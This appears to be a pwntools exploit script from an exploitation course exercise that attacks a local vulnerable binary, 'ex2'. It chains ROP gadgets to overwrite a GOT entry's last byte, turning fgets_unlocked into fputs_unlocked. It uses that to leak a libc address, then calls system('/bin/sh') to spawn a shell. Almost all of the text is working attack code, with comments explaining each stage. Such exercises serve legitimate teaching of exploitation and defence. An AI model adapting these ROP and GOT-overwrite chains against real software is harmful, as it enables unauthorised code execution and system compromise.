################################################################################
# ex2-exploit.py
#   Chapter:02
#   Binary: ex2
#   Source: ex2.c
#   Goal  :  Without using ret2dl_resolve, spwan a shell by running
#            system("/bin/sh\x00")
################################################################################
from pwn import *

################################################################################
#   ropDumpMemory(addr):
#       Constructs and returns a ROP-chain that leaks what's at address "addr"
#       by calling fgets_unlocked AFTER it has been overwritten with
#       fputs_unlocked! 
################################################################################
def ropDumpMemory(addr):

    rop     =   b''
    rop     +=  p64(pop_rdi)
    rop     +=  p64(addr)                           # rdi <- addr
    # We need to set stdout into rsi. At *_fds we have stdin,stdout:
    # We need to de-reference *_fds+8 and put its value into RSI:
    rop     +=  p64(pop_rbp)
    # mov rsi, qword ptr [rbp - 0x18]; ret;
    rop     +=  p64(_fds+8 + 0x18)                  #
    rop     +=  p64(mov_rsi)                        # rsi <- *(_fds+8)
    # So in fact: fputs_unlocked(addr,stdout):
    rop     +=  p64(binary.symbols["plt.fgets_unlocked"])

    return rop

################################################################################
#   ropOverwriteGets():
#       Constructs a ROP-gadget that overwrites fgets_unlocked@got last byte
#       with value.
################################################################################
def ropOverwriteGets(value):
    
    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(binary.symbols["got.fgets_unlocked"])# fgets_unlocked@got
    rop +=  p64(pop_rsi)
    rop +=  p64(value)                              # rsi <- value
    rop +=  p64(pop_rdx)
    rop +=  p64(0x1)                                # rdx = 0x1
    # memset(*fgets_unlocked@got,0x90,1);
    rop +=  p64(binary.symbols["plt.memset"])       # memset()

    return rop

################################################################################
#   ropShell(cmd_addr,system_addr):
#       Constructs a simple ROP-chain that runs system(*cmd_addr)
################################################################################
def ropShell(cmd_addr,system_addr):

    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(cmd_addr)
    rop +=  p64(system_addr)

    return rop

# Binary protections:
# checksec --file ex2
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)
vuln    =   "./ex2"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
pop_rdi =   0x4011e2
pop_rsi =   0x4011e4
pop_rdx =   0x4011e6
pop_rbp =   0x40112d
mov_rsi =   0x4011e8
ret     =   0x401016

#   0x0007ff00   10    127 sym.fgets_unlocked       ; last byte 0x00
#   0x0007ff90    8    141 sym.fputs_unlocked       ; last byte 0x90
#   If your local libc6 version is different from 2.36, these offsets
#   may vary. Make sure to fix them before running this exploit:
#   See below:
fputs_byte  =   0x90
fgets_byte  =   0x00

# We start a local process of the vulnerable program:
r = process(binary.path)

# stdin and stdout are stored in _fds[] array-
# stdin:    *_fds, stdout: *(_fds+8):
_fds = binary.symbols["_fds"]
info("fds array at *0x%02x" % _fds)

# Without using ret2dlresolve, this challenge is a bit more difficult.
# As we can see, the program does not call any function like write,puts,printf,
# etc, so it seems we cannot leak anything. 
#
# Let's have a look at its got table:
#
# [0x404000] memset@GLIBC_2.2.5  →  0x7ffff7ef5fc0
# [0x404008] fgets_unlocked@GLIBC_2.2.5  →  0x7ffff7e22f00
# [0x404010] setvbuf@GLIBC_2.2.5  →  0x7ffff7e1aea0
#
# We cannot re-use these functions to set, for example, 0x3b into RAX.
# memset returns void * whereas fgets_unlocked returns a char *. setvbuf
# returns 0 on success; nonzero on failure. We cannot
# dump opcodes because the program does not output anything.
#
# We observe the following (glibc 2.36):
#   0x0007ff00   10    127 sym.fgets_unlocked       ; last byte 0x00
#   0x0007ff90    8    141 sym.fputs_unlocked       ; last byte 0x90
#
# So we can overwrite *fgets_unlocked@got with byte 0x90 and a call to
# fgets_unlocked@plt will, in fact, call fputs_unlocked@plt! But we need
# to prepare our entire ROP-chain so that right after calling fputs_unlocked(),
# our ROP-chain restores *fgets_unlocked@got last byte to 0x00 and calls it
# again to process our second stage payload!
# So this will be our strategy:
warning("1st stage: fgets_unlocked <-> fputs_unlocked & leak")
r.send(
    padding + p64(RBP)
    + ropOverwriteGets(fputs_byte)
    + ropDumpMemory(binary.symbols["got.setvbuf"])
    + ropOverwriteGets(fgets_byte)
    + p64(binary.symbols["main"])
    + b'\x0a'
)
# Right after sending our ROP-chain, we get our leak and the program
# is waiting for more input from us:
setvbuf_addr = int(r.recv(6)[::-1].hex(),16)
info("setvbuf() leaked! 0x%02x " % setvbuf_addr)

# Now, we can compute the usual stuff (bin_sh, system) and run our
# remote shell with a second ROP-chain, this time the usual one:
libc6   =   ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc6_base  =   setvbuf_addr - libc6.symbols["setvbuf"]
warning("libc6 base address at 0x%02x" % libc6_base)
system  =    libc6.symbols["system"] + libc6_base
warning("libc6 system at 0x%02x" % system)
bin_sh  =   next(libc6.search(b'/bin/sh')) + libc6_base
warning("libc6 '/bin/sh\x00' at 0x%02x" % bin_sh)

# We send our last ROP-chain to gain a remote shell:
warning("2nd stage: spwaning a shell!")
r.send(padding + p64(RBP) + ropShell(bin_sh,system) + b'\x0a')
r.interactive()
r.close()
